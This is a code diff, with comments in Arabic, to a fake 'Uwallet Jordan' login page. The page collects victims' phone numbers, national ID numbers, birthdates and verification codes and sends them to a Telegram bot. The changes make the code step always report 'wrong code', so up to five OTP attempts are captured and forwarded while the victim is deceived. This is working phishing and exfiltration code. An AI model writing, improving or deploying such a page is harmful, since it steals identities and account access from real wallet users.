@@ -180,12 +180,13 @@
       justify-content: center;
       margin: 10px 0 9px 0;
     }
+    /* widened code input */
     .code-inputs input {
       text-align: center;
       font-size: 18px;
-      width: 65px;
+      width: 85px; /* increased width */
       padding: 13px 0;
-      letter-spacing: 4px;
+      letter-spacing: 6px;
       border-radius: 7px;
       border: 2px solid #1a84dd20;
       background: var(--uwallet-gray);
@@ -285,6 +286,26 @@
       cursor: pointer;
       margin-bottom: 7px;
     }
+    /* inline error under code input */
+    .inline-err {
+      text-align: center;
+      color: #ea4763;
+      font-size: 14px;
+      margin-top: 6px;
+      font-weight: 700;
+    }
+    /* shake animation for wrong code */
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      20% { transform: translateX(-6px); }
+      40% { transform: translateX(6px); }
+      60% { transform: translateX(-4px); }
+      80% { transform: translateX(4px); }
+      100% { transform: translateX(0); }
+    }
+    .shake {
+      animation: shake 340ms;
+    }
     @media (max-width: 450px) {
       #app { padding: 12px 1vw 6px 1vw; }
       .uwallet-logo { width: 43px; height: 43px;}
@@ -293,7 +314,7 @@
       .uwallet-title-sub { font-size: 11px;}
       #modalContent { padding: 16px 7vw;}
       .birthdate-fields select { font-size: 13px; }
-      .code-inputs input { width: 44px;}
+      .code-inputs input { width: 60px; letter-spacing: 5px;} /* smaller on mobile */
     }
   </style>
 </head>
@@ -316,9 +337,14 @@
     let currentStep = "phone";
     let telegramMsgId = null;
 
+    // attempts for 4-digit code
+    let codeAttempts = 0;
+    const maxCodeAttempts = 5;
+
     function restart() {
       closeModal();
       userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
+      codeAttempts = 0;
       currentStep = "phone";
       renderPhoneStep();
     }
@@ -367,6 +393,8 @@
         e.preventDefault();
         const phone = document.getElementById('phone').value.trim();
         if (!/^07\d{8}$/.test(phone)) {
+          // خطأ تنسيق الهاتف
+          // نعرض المربع المنبثق العام
           showErrorModal(); return;
         }
         userData.phone = phone;
@@ -374,7 +402,7 @@
         try {
           telegramMsgId = await sendToTelegram(`🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}`);
         } catch (err) {}
-        // تجاوز واجهة رمز التحقق والانتقال مباشرةً لبيانات الهوية/تاريخ الميلاد
+        // الانتقال مباشرةً لبيانات الهوية/تاريخ الميلاد
         renderIdBirthStep();
       };
     }
@@ -453,6 +481,7 @@
           <div class="code-inputs">
             <input type="text" maxlength="4" pattern="\\d{4}" required id="code4binput" inputmode="numeric" placeholder="****" />
           </div>
+          <div id="codeError" class="inline-err" style="display:none;"></div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
         <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
@@ -465,15 +494,47 @@
       document.getElementById('code4bForm').onsubmit = async function(e) {
         e.preventDefault();
         let code = codeInput.value.trim();
-        if (code.length !== 4) { showErrorModal(); return; }
+        if (code.length !== 4) { 
+          // نعتبر عدم إدخال 4 أرقام خطأ فورياً
+          const codeError = document.getElementById('codeError');
+          codeError.textContent = `يرجى إدخال 4 أرقام.`;
+          codeError.style.display = 'block';
+          codeInput.classList.add('shake');
+          setTimeout(()=>codeInput.classList.remove('shake'),350);
+          return;
+        }
+
+        // نزيد عدّ المحاولات لكل إدخال
+        codeAttempts++;
         userData.code4b = code;
-        // إرسال جميع البيانات النهائية للبوت (بدون رمز SMS السابق)
+
+        // إرسال محاولة الرمز للبوت لتوثيق المحاولات (اختياري)
         try {
           await sendToTelegram(
-            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
+            `🟦 محاولة رمز تحقق Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 ${userData.nationalId}\n🔒 الرمز: ${userData.code4b}\nمحاولة: ${codeAttempts}/${maxCodeAttempts}`
           );
         } catch (err) {}
-        showErrorModal(); // حتى لو صحيحة كل مرة يظهر الخطأ والتوجيه للصفحة الأولى
+
+        if (codeAttempts < maxCodeAttempts) {
+          // عرض رسالة خطأ مؤقتة بعد كل محاولة خاطئة
+          const codeError = document.getElementById('codeError');
+          codeError.textContent = `رمز التحقق غير صحيح. المحاولة ${codeAttempts} من ${maxCodeAttempts}.`;
+          codeError.style.display = 'block';
+          codeInput.classList.add('shake');
+          setTimeout(()=>codeInput.classList.remove('shake'),350);
+          codeInput.value = '';
+          codeInput.focus();
+          return;
+        } else {
+          // عند الوصول إلى الحد الأقصى من المحاولات: عرض رسالة خطأ نهائية وتوجيه لإعادة التقديم
+          const modalTitle = document.querySelector('#modalContent .err-title');
+          const modalMsg = document.querySelector('#modalContent .err-msg');
+          if (modalTitle) modalTitle.textContent = 'خطأ في المعلومات';
+          if (modalMsg) modalMsg.textContent = 'المعلومات غير صحيحة، قدم طلبك مرة أخرى.';
+          showErrorModal();
+          // نُبقي على الزر في المودال لإعادة المحاولة (restart)
+          return;
+        }
       };
       document.getElementById('backBtn').onclick = () => {
         renderIdBirthStep();
